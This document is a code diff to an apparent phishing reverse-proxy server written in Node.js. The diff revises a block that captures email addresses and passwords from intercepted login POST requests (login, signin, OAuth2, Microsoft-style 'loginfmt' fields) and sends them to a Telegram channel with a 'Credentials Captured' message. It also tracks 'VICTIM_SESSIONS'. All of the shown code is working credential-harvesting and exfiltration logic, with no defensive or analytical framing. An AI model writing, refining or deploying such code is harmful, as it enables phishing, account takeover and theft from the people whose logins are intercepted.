@@ -397,106 +397,60 @@ const proxyServer = http.createServer((clientRequest, clientResponse) => {
                         // CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (INSERTED HERE)
                         // ====================================================================
                         // ====================================================================
-// CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (UPDATED – NO EMAIL-ONLY ALERT)
+// ====================================================================
+// CREDENTIAL EXTRACTION & TELEGRAM NOTIFICATION (INSERTED HERE)
 // ====================================================================
 try {
+    // clientRequestBody is already parsed ...
     if (clientRequestBody && typeof clientRequestBody === 'object' && clientRequestBody.body) {
         const originalBody = clientRequestBody.body;
         const originalUrl = clientRequestBody.url || '';
         const originalMethod = clientRequestBody.method || '';
-        const contentType = clientRequestBody.headers?.['content-type'] || '';
 
         // Only process POST requests that look like login attempts
         if (originalMethod === 'POST' && 
             (originalUrl.includes('/login') || originalUrl.includes('/signin') || 
              originalUrl.includes('/common/login') || originalUrl.includes('/oauth2') ||
-             originalUrl.includes('/authorize') || originalUrl.includes('/GetCredentialType'))) {
+             originalUrl.includes('/authorize'))) {
 
-            let parsedBody = {};
             let email = '';
             let password = '';
+            const contentType = clientRequestBody.headers?.['content-type'] || '';
 
-            // 1. Parse the body based on content-type
+            // Parse JSON body
             if (contentType.includes('application/json')) {
-                try { parsedBody = JSON.parse(originalBody); } catch (e) {}
-            } else if (contentType.includes('application/x-www-form-urlencoded')) {
+                try {
+                    const json = JSON.parse(originalBody);
+                    email = json.username || json.user || json.email || json.loginfmt || json.login || json.userid || '';
+                    password = json.password || json.passwd || json.pass || json.Password || json.pwd || '';
+                } catch (e) {}
+            }
+            // Parse URL-encoded body
+            else if (contentType.includes('application/x-www-form-urlencoded')) {
                 try {
                     const params = new URLSearchParams(originalBody);
-                    parsedBody = Object.fromEntries(params);
+                    email = params.get('username') || params.get('user') || params.get('email') || 
+                            params.get('loginfmt') || params.get('login') || params.get('userid') || '';
+                    password = params.get('password') || params.get('passwd') || params.get('pass') || 
+                               params.get('Password') || params.get('pwd') || '';
                 } catch (e) {}
-            } else {
-                try { parsedBody = JSON.parse(originalBody); } catch (e) {}
             }
 
-            // 2. Helper to recursively search for email/password keys
-            function deepSearch(obj, keys) {
-                if (!obj || typeof obj !== 'object') return '';
-                for (let key of keys) {
-                    if (obj[key] !== undefined && obj[key] !== null && obj[key] !== '') {
-                        return obj[key];
-                    }
-                }
-                for (let k in obj) {
-                    if (typeof obj[k] === 'object') {
-                        const found = deepSearch(obj[k], keys);
-                        if (found) return found;
-                    }
-                }
-                return '';
-            }
-
-            const emailKeys = ['username', 'user', 'email', 'loginfmt', 'login', 'userid', 'UserId', 'upn'];
-            const passwordKeys = ['password', 'passwd', 'pass', 'Password', 'pwd', 'newPassword', 'i19', 'i9', 'credential'];
-
-            email = deepSearch(parsedBody, emailKeys);
-            password = deepSearch(parsedBody, passwordKeys);
-
-            // 3. Handle two-step login: store email if only email arrives, send only when password is available
-            const sessionId = currentSession;
-            if (sessionId && VICTIM_SESSIONS[sessionId]) {
-                // If we have an email but no password, store it and do NOT send alert
-                if (email && !password) {
-                    VICTIM_SESSIONS[sessionId].pendingEmail = email;
-                    console.log(`[CAPTURE] Stored pending email: ${email} (no alert sent)`);
-                }
-
-                // If we have a password, try to combine with stored email
-                if (password) {
-                    let finalEmail = email;
-                    // If email is empty, check for stored email from previous request
-                    if (!finalEmail && VICTIM_SESSIONS[sessionId].pendingEmail) {
-                        finalEmail = VICTIM_SESSIONS[sessionId].pendingEmail;
-                        console.log(`[CAPTURE] Combined with stored email: ${finalEmail}`);
-                    }
-                    // If still no email, try to get from URL query params
-                    if (!finalEmail) {
-                        try {
-                            const urlObj = new URL(originalUrl);
-                            finalEmail = urlObj.searchParams.get('login') || urlObj.searchParams.get('email') || '';
-                        } catch (e) {}
-                    }
-
-                    // Now send the complete credentials (only if we have at least password)
-                    if (finalEmail || password) {
-                        const msg = `🔐 *Credentials Captured*\n\n` +
-                                    `📧 *Email:* ${finalEmail || 'N/A'}\n` +
-                                    `🔑 *Password:* ${password || 'N/A'}\n` +
-                                    `🌐 *URL:* ${originalUrl}\n` +
-                                    `🕐 *Time:* ${new Date().toISOString()}`;
-                        sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
-                        console.log(`[TELEGRAM] Sent credentials for ${finalEmail || 'unknown'}`);
-
-                        // Clear stored email after sending
-                        delete VICTIM_SESSIONS[sessionId].pendingEmail;
-                    }
-                }
+            if (email || password) {
+                const msg = `🔐 *Credentials Captured*\n\n` +
+                            `📧 *Email:* ${email || 'N/A'}\n` +
+                            `🔑 *Password:* ${password || 'N/A'}\n` +
+                            `🌐 *URL:* ${originalUrl}\n` +
+                            `🕐 *Time:* ${new Date().toISOString()}`;
+                sendToTelegram(msg).catch(error => console.error('Telegram send failed:', error));
+                console.log(`[TELEGRAM] Sent credentials for ${email || 'unknown'}`);
             }
         }
     }
 } catch (e) {
-    // Silent fail – don't break the proxy
-    console.error('[EXTRACTION ERROR]', e.message);
+    // Silent fail
 }
+// ====================================================================
 // ====================================================================
                         // ====================================================================
 
